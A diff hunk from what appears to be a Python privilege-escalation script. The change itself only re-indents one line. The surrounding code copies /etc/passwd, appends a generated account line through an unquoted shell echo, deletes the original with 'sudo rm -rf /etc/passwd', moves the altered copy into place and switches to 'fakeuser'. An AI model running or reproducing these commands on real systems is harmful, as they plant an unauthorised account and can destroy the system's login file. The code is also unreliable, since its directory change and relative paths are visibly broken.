@@ -12,7 +12,7 @@ import os
   		os.system('cd /etc/')
   		linea = '"' + linea_generada + '"'
   		os.system('sudo cp /etc/passwd /etc/passwd.txt')
-os.system('echo ' + linea + ' >> passwd.txt')
+      os.system('echo ' + linea + ' >> passwd.txt')
   		os.system('sudo rm -rf /etc/passwd')
   		os.system('sudo mv /etc/passwd.txt /etc/passwd')
   		os.system('su fakeuser')
